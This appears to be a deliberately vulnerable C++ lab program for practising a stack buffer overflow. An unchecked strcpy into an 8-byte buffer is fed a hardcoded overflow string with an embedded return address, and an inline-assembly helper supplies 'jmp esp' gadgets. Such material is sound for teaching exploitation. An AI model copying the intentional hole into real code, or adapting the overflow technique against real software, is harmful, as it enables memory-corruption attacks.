// vulnprogram.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"

class Foo {
  public:
  void __declspec(noinline) gs3(char* src)
  {
   char buf[8];
   strcpy(buf, src);
   bar(); // virtual function call
  }
   virtual void __declspec(noinline) bar()
   {
   }
 }; //11121640 <- inside helper function. which is also the address to jmp esp
int main()
{
  Foo foo;
  foo.gs3(
  "AAAA"
  "BBBB"
  "CCCC"
  "DDDD"
  "\x58\x16\x12\x11"
  "EEEE"
  "FFFF"
  "GGGG"
  "HHHH"
  "IIII"
  "JJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYAAAA"
  );
 return 0;
}
// bp 11211500
void helper_function() {
	__asm {
		jmp esp
pop esp
push ss
adc dl,BYTE PTR [ecx] // second jmp esp
jmp esp
jmp esp
jmp esp
jmp esp
jmp esp
jmp esp
		jmp eax
		ret
		adc DWORD PTR [edx], edx
		push ss;
		inc eax
		ret
		inc eax
		push ss
		adc dl, BYTE PTR[ECX]
mov esp, edi;
jmp esp;
ret;
jmp edi;
jmp edi;		
jmp edi;
	}
}
